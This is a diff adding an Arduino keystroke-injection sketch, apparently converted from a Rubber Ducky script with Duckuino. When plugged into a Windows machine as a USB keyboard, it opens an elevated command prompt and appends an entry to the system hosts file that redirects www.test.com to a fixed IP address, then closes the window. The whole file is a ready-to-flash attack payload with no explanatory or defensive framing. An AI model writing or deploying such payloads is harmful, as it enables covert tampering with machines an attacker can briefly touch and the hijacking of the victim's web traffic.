@@ -1,0 +1,62 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(2000);
+  typeKey(KEY_ESC);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  delay(400);
+  Keyboard.print(F("cmd"));
+
+  delay(400);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(400);
+  Keyboard.print(F("cd C:\\Windows\\System32\\drivers\\etc\\"));
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+  Keyboard.print(F("echo 64.149.122.94 www.test.com>>hosts"));
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  Keyboard.print(F("c"));
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
